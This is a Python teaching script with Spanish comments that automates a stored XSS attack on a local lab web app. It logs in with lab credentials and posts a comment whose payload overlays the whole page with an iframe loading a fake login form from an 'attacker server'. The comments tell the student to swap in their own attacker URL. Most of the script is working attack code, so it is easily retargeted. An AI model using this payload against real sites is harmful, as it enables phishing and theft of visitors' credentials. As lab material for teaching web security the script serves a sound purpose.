import requests

# --- Explicación para el alumno ---
# Este script automatiza la publicación de un comentario con un payload de XSS Almacenado.
# El payload inyectará un formulario de login falso en la página para robar credenciales.

# 1. Las URLs y datos de inicio de sesión de nuestro laboratorio.
login_url = "http://localhost/lab_xss/index.php"
profile_url = "http://localhost/lab_xss/profile.php"
login_payload = {
    'username': 'admin',  # Usamos una cuenta válida para poder publicar
    'password': 'password123'
}

# 2. Crear una sesión para mantener las cookies de login entre peticiones.
session = requests.Session()

print("--- Explicación del Ataque XSS Almacenado ---")
print("1. El atacante inicia sesión en el sitio para poder publicar un comentario.")

try:
    # 3. Realizar la petición POST para iniciar sesión.
    response = session.post(login_url, data=login_payload)

    # Verificar si el login fue exitoso (comprobando la redirección a profile.php o un contenido específico)
    if "profile.php" in response.url or response.status_code == 302:
        print("Login exitoso.")
        
        # 4. El payload para el XSS Almacenado.
        # - Crea un div que cubre toda la página (position: fixed).
        # - Dentro, carga un formulario de login falso desde el servidor del atacante usando un <iframe>.
        # - El estilo z-index asegura que esté por encima de todo.
        # - IMPORTANTE: Debes cambiar esta URL a la de tu servidor atacante.
        attacker_fake_login_url = "http://localhost/lab_xss/fake_login.html"
        
        payload = f'<div style="position:fixed; top:0; left:0; width:100%; height:100%; background-color:rgba(0,0,0,0.5); z-index:9999; display:flex; justify-content:center; align-items:center;"><iframe src="{attacker_fake_login_url}" style="border:none; width:400px; height:300px;"></iframe></div>'
        comment_payload = {'comment': payload}

        print("2. El atacante publica el comentario malicioso.")
        
        # 5. Realizar la petición POST para publicar el comentario.
        response = session.post(profile_url, data=comment_payload)
        
        if response.status_code == 200:
            print(" Comentario malicioso publicado con éxito.")
            print("\n¿Qué pasa ahora?")
            print(" - El payload se ha guardado en la base de datos.")
            print(" - CUALQUIER USUARIO (incluido el admin) que visite profile.php verá el formulario fijo.")
            print(" - Si intentan iniciar sesión, sus credenciales serán enviadas al atacante.")
        else:
            print(f"Error al publicar el comentario. Código de estado: {response.status_code}")
            print("Respuesta del servidor:", response.text) # Útil para depurar
    else:
        print("Falló el login al sitio vulnerable. Revisa las credenciales o la URL.")
        print("Código de estado:", response.status_code)

except requests.exceptions.RequestException as e:
    print(f"Ocurrió un error de conexión: {e}")
